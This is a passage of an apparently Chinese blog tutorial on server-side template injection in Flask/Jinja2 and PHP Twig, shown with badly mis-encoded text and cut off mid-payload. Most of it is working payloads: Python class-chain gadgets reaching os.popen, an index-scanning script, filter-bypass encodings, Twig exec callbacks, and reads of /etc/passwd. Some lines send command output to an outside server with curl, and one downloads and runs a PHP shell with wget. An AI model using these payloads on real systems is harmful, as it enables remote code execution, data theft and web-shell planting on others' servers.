ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚(æ²¿ç€å®ä¾‹è™šçº¿ç®­å¤´å‘ä¸Šè·³ä¸€çº§ï¼Œå¯¹&lt;class &#x27;type&#x27;&gt;ä¸€ç›´ä½¿ç”¨ï¼Œä»è¿”å›&lt;class &#x27;type&#x27;&gt;ï¼Œä¸ä¼šè·³åˆ°object)è°ƒç”¨çš„æ—¶å€™ä¼šå±è”½ç±»å†…å®šä¹‰çš„åŒåå±æ€§__class__</span></span><br><span class="line">__base__             <span class="comment"># ç±»å‹å¯¹è±¡çš„ä¸€ä¸ªç›´æ¥åŸºç±»(çˆ¶ç±»)(æ²¿ç€ç»§æ‰¿å®çº¿ç®­å¤´å‘ä¸Šè·³ä¸€çº§)</span></span><br><span class="line">__bases__            <span class="comment"># ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»(å¾—æ˜¯ç›´æ¥ç»§æ‰¿çš„ï¼Œä¸èƒ½æ˜¯é€šè¿‡ç»§æ‰¿çš„ä¼ é€’æ€§çš„)ï¼Œä»¥å…ƒç»„å½¢å¼å±•ç¤ºï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ __bases__</span></span><br><span class="line">__mro__              <span class="comment"># æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾åŸºç±»,è¿”å›æ‰€æœ‰ç›´æ¥æˆ–é—´æ¥çš„åŸºç±»(çˆ¶ç±»),åŒæ—¶ä¹Ÿè¿”å›è‡ªèº«ï¼ŒæŒ‰ç…§è°ƒç”¨é¡ºåºï¼Œè‡ªèº«æ˜¯å…ƒç»„ä¸­çš„ç¬¬ä¸€ä¸ª,objectæ˜¯æœ€åä¸€ä¸ª,å› æ­¤ä¹Ÿç”¨&#x27;&#x27;.__class__.__mro__[-1]æ–¹å¼å¾—åˆ°object</span></span><br><span class="line">__subclasses__()     <span class="comment"># è¿”å›è¿™ä¸ªç±»çš„å­ç±»é›†åˆ(å­ç±»æ²¡æœ‰é—´æ¥æ€§)</span></span><br><span class="line">__init__             <span class="comment"># åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function</span></span><br><span class="line">__globals__          <span class="comment"># ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å.__globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚(ä½¿ç”¨åœºæ™¯:ç±».__init__.globals)</span></span><br><span class="line">__dict__             <span class="comment"># ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ</span></span><br><span class="line">__getattribute__()   <span class="comment"># å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚ï¼ša.xxx/a.xxx()ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚</span></span><br><span class="line">__getitem__()        <span class="comment"># è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a[&#x27;b&#x27;]ï¼Œå°±æ˜¯a.__getitem__(&#x27;b&#x27;)</span></span><br><span class="line">__builtins__         <span class="comment"># å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚</span></span><br><span class="line"><span class="built_in">__import__</span>           <span class="comment"># åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read() å¾—åˆ°lså‘½ä»¤æ‰§è¡Œç»“æœ</span></span><br><span class="line">__str__()            <span class="comment"># è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚</span></span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032356329.png"                                     ></p><h2 id="åˆ©ç”¨evalå†…å»ºå‡½æ•°æ‰§è¡Œå‘½ä»¤â€“payloadç†è§£"><a href="#åˆ©ç”¨evalå†…å»ºå‡½æ•°æ‰§è¡Œå‘½ä»¤â€“payloadç†è§£" class="headerlink" title="åˆ©ç”¨evalå†…å»ºå‡½æ•°æ‰§è¡Œå‘½ä»¤â€“payloadç†è§£"></a>åˆ©ç”¨evalå†…å»ºå‡½æ•°æ‰§è¡Œå‘½ä»¤â€“payloadç†è§£</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__ <span class="comment"># è·å–åˆ°object</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">99</span>] <span class="comment"># åˆ©ç”¨è„šæœ¬çš„æ‰¾åˆ°_frozen_importlib_external.FileLoaderç±»ï¼Œä¸‹æ ‡æ¯ä¸€æ¬¡éƒ½ä¸ä¸€å®šä¸€æ ·</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">99</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls +/&#x27;).read()&quot;</span>) <span class="comment"># åˆ©ç”¨è¯¥ç±»å«æœ‰builtinsç±»ä¸­çš„å†…å»ºevalæ‰§è¡Œå‘½ä»¤ï¼Œosæ¨¡å—ä¸­çš„popenå‡½æ•°ä¸systemå‡½æ•°éƒ½èƒ½ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½†æ˜¯systemå‡½æ•°ä¸ä¼šè¿”å›å‘½ä»¤æ‰§è¡Œç»“æœ</span></span><br></pre></td></tr></table></figure></div><blockquote><p>æ‰§è¡Œsystemå‡½æ•°ï¼Œæ‰“å°å‡º0ï¼Œè¡¨ç¤ºå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼›å¦åˆ™è¡¨ç¤ºå¤±è´¥</p><p>os.popen()è¿”å›çš„æ˜¯ <strong>file read</strong> çš„å¯¹è±¡ï¼Œå¯¹å…¶è¿›è¡Œè¯»å–read()æ“ä½œå¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„è¾“å‡º</p><p>æ³¨æ„ï¼šåœ¨æƒ³è¦ä½¿ç”¨<code>popen</code>æ­é…å‡ ä¸ª<code>read</code>å‡½æ•°è·å–å‘½ä»¤æ‰§è¡Œç»“æœæ—¶è¯·åŠ¡å¿…æ³¨æ„æ¢è¡Œç¬¦<code>\n</code>ï¼Œè¿›è¡Œå­—ç¬¦ä¸²å¤„ç†æ—¶éœ€å¯¹è¯¥<code>\n</code>ç¬¦è¿›è¡Œå¤„ç†</p></blockquote><h3 id="ğŸ’¡Tipsâ€“å‡ ä¸ªå«æœ‰evalå‡½æ•°çš„ç±»"><a href="#ğŸ’¡Tipsâ€“å‡ ä¸ªå«æœ‰evalå‡½æ•°çš„ç±»" class="headerlink" title="ğŸ’¡Tipsâ€“å‡ ä¸ªå«æœ‰evalå‡½æ•°çš„ç±»"></a>ğŸ’¡Tipsâ€“å‡ ä¸ªå«æœ‰evalå‡½æ•°çš„ç±»</h3><ul><li>warnings.catch_warnings</li><li>WarningMessage</li><li>codecs.IncrementalEncoder</li><li>codecs.IncrementalDecoder</li><li>codecs.StreamReaderWriter</li><li>os._wrap_close</li><li>reprlib.Repr</li><li>weakref.finalize</li><li>_frozen_importlib_external.FileLoader</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯»æ‰¾evalè„šæœ¬</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:5000/?id=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"> <span class="comment"># ä¹Ÿå¯ä»¥å¯»æ‰¾builtinsç±»ï¼Œå…¶ç±»ä¸‹æœ‰å†…å»ºå‡½æ•°evalå­ç±»</span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>__builtins__</code>ä¸ºå†…å»ºæ¨¡å— builtinå­˜åœ¨äºpython2ä¸­ï¼Œè€Œåœ¨python3ä¸­è¢«å‘½åä¸ºbuiltinsï¼Œ<code>__builtins__</code>å®é™…ä¸Šæ˜¯<code>__builtin__</code>å’Œ<code>builtins</code>çš„å¼•ç”¨</p></blockquote><h3 id="å‡½æ•°å…³é”®å­—ç»•è¿‡"><a href="#å‡½æ•°å…³é”®å­—ç»•è¿‡" class="headerlink" title="å‡½æ•°å…³é”®å­—ç»•è¿‡"></a>å‡½æ•°å…³é”®å­—ç»•è¿‡</h3><p>åˆ©ç”¨<code>__dict__</code>æ–¹æ³•ï¼Œ</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.__dict__[<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ystem&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>åˆ©ç”¨<code>__getattribute__</code>æ–¹æ³•ç»•è¿‡ </p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__init__.__getattribute__(<span class="string">&#x27;__global&#x27;</span>+<span class="string">&#x27;s__&#x27;</span>)[<span class="string">&#x27;sys&#x27;</span>] <span class="comment"># æ‹¼æ¥</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span><span class="string">&quot;ss__&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__ssalc__&quot;</span>[::-<span class="number">1</span>]) <span class="comment"># åè½¬</span></span><br></pre></td></tr></table></figure></div><p>asciiè½¬æ¢</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)] <span class="comment"># ç­‰ä»·äº&quot;&quot;.__class__</span></span><br></pre></td></tr></table></figure></div><p>systemå‡½æ•°ä»£æ›¿popen,é…åˆvpsä¸curlå‘½ä»¤</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls &gt; tt.txt &amp; cat tt.txt | xargs -I &#123;&#125; curl http://vpså…¬ç½‘IPåœ°å€/?&#123;&#125;&#x27;</span>)  <span class="comment"># è¿™é‡Œç”¨åˆ°äº†xargsæ¥ä¼ é€’ç®¡é“å‚æ•°ï¼Œxargsçš„ä¸€ä¸ªé€‰é¡¹-Iï¼Œä½¿ç”¨-IæŒ‡å®šä¸€ä¸ªæ›¿æ¢å­—ç¬¦ä¸²&#123;&#125;ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²åœ¨xargsæ‰©å±•æ—¶ä¼šè¢«æ›¿æ¢æ‰ï¼Œå½“-Iä¸xargsç»“åˆä½¿ç”¨ï¼Œæ¯ä¸€ä¸ªå‚æ•°å‘½ä»¤éƒ½ä¼šè¢«æ‰§è¡Œä¸€æ¬¡</span></span><br></pre></td></tr></table></figure></div><h3 id="ç‚¹å·-ç»•è¿‡"><a href="#ç‚¹å·-ç»•è¿‡" class="headerlink" title="ç‚¹å·.ç»•è¿‡"></a>ç‚¹å·<code>.</code>ç»•è¿‡</h3><p>åˆ©ç”¨<code>attr</code>ç»•è¿‡ e.g. <code>&quot;&quot;|attr(&quot;__class__&quot;) </code> ç›¸å½“äº <code>&quot;&quot;.__class__</code></p><p>åˆ©ç”¨<code>[]</code>ç»•è¿‡ e.g. <code>&#123;&#123;"".__class__&#125;&#125;</code>ç›¸å½“äº <code>&#123;&#123;""['__classs__']&#125;&#125;</code></p><h3 id="ä¸­æ‹¬å·-ç»•è¿‡"><a href="#ä¸­æ‹¬å·-ç»•è¿‡" class="headerlink" title="ä¸­æ‹¬å·[]ç»•è¿‡"></a>ä¸­æ‹¬å·<code>[]</code>ç»•è¿‡</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.pop(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.get(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.setdefault(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;  <span class="comment"># setdefault å‡½æ•°çš„åŠŸèƒ½ï¼šè·å–æŸä¸ª key çš„valueï¼Œè‹¥ key ä¸å­˜åœ¨äºå­—å…¸ä¸­ï¼Œå°†ä¼šæ·»åŠ  key å¹¶å°† value è®¾ä¸ºé»˜è®¤å€¼</span></span><br></pre></td></tr></table></figure></div><h3 id="ä¸‹åˆ’çº¿-ç»•è¿‡"><a href="#ä¸‹åˆ’çº¿-ç»•è¿‡" class="headerlink" title="ä¸‹åˆ’çº¿_ç»•è¿‡"></a>ä¸‹åˆ’çº¿<code>_</code>ç»•è¿‡</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;app\x2Epy&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#ä¹Ÿå°±æ˜¯</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">91</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>â€œ\x5fâ€æ˜¯å­—ç¬¦ â€_â€œï¼Œâ€\x2Eâ€æ˜¯å­—ç¬¦ â€œ.â€ã€‚</p></blockquote><h2 id="PHPä¸­çš„SSTI"><a href="#PHPä¸­çš„SSTI" class="headerlink" title="PHPä¸­çš„SSTI"></a>PHPä¸­çš„SSTI</h2><p>phpå¸¸è§çš„æ¨¡æ¿ï¼štwigï¼Œsmartyï¼Œblade</p><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ã€€ã€€<span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line">ã€€ã€€<span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line">ã€€ã€€<span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line">ã€€ã€€<span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]));  <span class="comment">// å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡ç‰ˆå˜é‡çš„å€¼</span></span><br><span class="line">ã€€ã€€<span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>Twigä½¿ç”¨ä¸€ä¸ªåŠ è½½å™¨ loader(Twig_Loader_Array) æ¥å®šä½æ¨¡æ¿ï¼Œä»¥åŠä¸€ä¸ªç¯å¢ƒå˜é‡ environment(Twig_Environment) æ¥å­˜å‚¨é…ç½®ä¿¡æ¯ã€‚</p><p>render() æ–¹æ³•é€šè¿‡å…¶ç¬¬ä¸€ä¸ªå‚æ•°è½½å…¥æ¨¡æ¿ï¼Œå¹¶é€šè¿‡ç¬¬äºŒä¸ªå‚æ•°ä¸­çš„å˜é‡æ¥æ¸²æŸ“æ¨¡æ¿</p><blockquote><p>ä½†å³ä½¿å‘nameä¼ å…¥jsä»£ç è¿›è¡Œæ¸²æŸ“ä¹Ÿä¸èƒ½æˆåŠŸï¼Œå› ä¸ºæ¨¡ç‰ˆå¼•æ“ä¸€èˆ¬éƒ½é»˜è®¤å¯¹æ¸²æŸ“çš„å˜é‡å€¼è¿›è¡Œç¼–ç å’Œè½¬ä¹‰</p></blockquote><h3 id="æ¸²æŸ“çš„æ¨¡ç‰ˆå†…å®¹å—åˆ°ç”¨æˆ·çš„æ§åˆ¶"><a href="#æ¸²æŸ“çš„æ¨¡ç‰ˆå†…å®¹å—åˆ°ç”¨æˆ·çš„æ§åˆ¶" class="headerlink" title="æ¸²æŸ“çš„æ¨¡ç‰ˆå†…å®¹å—åˆ°ç”¨æˆ·çš„æ§åˆ¶"></a>æ¸²æŸ“çš„æ¨¡ç‰ˆå†…å®¹å—åˆ°ç”¨æˆ·çš„æ§åˆ¶</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ã€€ã€€<span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/../lib/Twig/Autoloader.php&#x27;</span>;</span><br><span class="line">ã€€ã€€<span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line">ã€€ã€€<span class="variable">$twig</span>=<span class="title function_ invoke__">newTwig_Environment</span>(<span class="title function_ invoke__">newTwig_Loader_String</span>());</span><br><span class="line">ã€€ã€€<span class="variable">$output</span>=<span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&quot;</span>);<span class="comment">// å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡ç‰ˆå†…å®¹çš„ä¸€éƒ¨åˆ†</span></span><br><span class="line">ã€€ã€€<span class="keyword">echo</span> <span class="variable">$output</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>æ­¤æ—¶å¯ä»¥ä¼ å…¥jsä»£ç æˆ–å…¶ä»–è¡¨è¾¾å¼ç­‰ï¼Œä¼šè¢«æˆåŠŸæ‰§è¡Œ</p></blockquote><h3 id="åˆ¤æ–­æŠ€å·§"><a href="#åˆ¤æ–­æŠ€å·§" class="headerlink" title="åˆ¤æ–­æŠ€å·§"></a>åˆ¤æ–­æŠ€å·§</h3><p>  ä½œä¸º Twig æ¨¡æ¿å¼•æ“çš„é»˜è®¤æ³¨é‡Šå½¢å¼ï¼Œæ‰€ä»¥åœ¨å‰ç«¯è¾“å‡ºçš„æ—¶å€™å¹¶ä¸ä¼šæ˜¾ç¤º</p><p>å› æ­¤å¯ä»¥å¾—åˆ°ä»¥ä¸‹åˆ¤æ–­æµç¨‹å›¾</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032356913.jpg"                      alt="image-20220816200203853"                ><figcaption>image-20220816200203853</figcaption></figure></p><p>å¦‚æœåœ¨webé¡µé¢çš„æºä»£ç ä¸­çœ‹åˆ°äº†è¯¸å¦‚ä»¥ä¸‹çš„å­—ç¬¦ï¼Œå°±å¯ä»¥æ¨æ–­ç½‘ç«™ä½¿ç”¨äº†æŸäº›æ¨¡æ¿å¼•æ“æ¥å‘ˆç°æ•°æ®</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;$what&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome, &#123;&#123;username&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;%$a%&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥æ³¨å…¥äº†æ¢æµ‹å­—ç¬¦ä¸² $579ï¼Œä»¥æŸ¥çœ‹åº”ç”¨ç¨‹åºæ˜¯å¦è¿›è¡Œäº†ç›¸åº”çš„è®¡ç®—</p></blockquote><p>åœ¨è¿™é‡Œæä¾›ä¸€ä¸ªé’ˆå¯¹twigçš„æ”»å‡»è½½è·ï¼š</p><div class="highlight-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(<span class="string">&quot;ls&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥å¡«å…¥ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</p></blockquote><p>æ¨¡æ¿æ³¨å…¥è¿œç¨‹ä¸‹è½½shellï¼Œå¹¶é‡å‘½åè¿è¡Œ</p><div class="highlight-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(<span class="string">&quot;wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></div><p>ä»¥ä¸Šå°±æ˜¯php twigæ¨¡æ¿æ³¨å…¥ï¼Œç”±äºä»¥ä¸Šä½¿ç”¨çš„twigä¸º2.xç‰ˆæœ¬ï¼Œç°åœ¨å®˜æ–¹å·²ç»æ›´æ–°åˆ°3.xç‰ˆæœ¬ï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£æ–°å¢äº† filter å’Œ map ç­‰å†…å®¹ï¼Œè¡¥å……ä¸€äº›æ–°ç‰ˆæœ¬çš„payloadï¼š</p><div class="highlight-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="string">&#x27;/etc/passwd&#x27;</span><span class="punctuation">|</span><span class="keyword">file_excerpt</span>(<span class="number">1</span>,<span class="number">30</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;app.request.files.get(<span class="number">1</span>).__construct(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;app.request.files.get(<span class="number">1</span>).openFile.fread(<span class="number">99</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(<span class="string">&quot;whoami&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;_self.env.enableDebug()&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.isDebug()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;[<span class="string">&quot;id&quot;</span>]<span 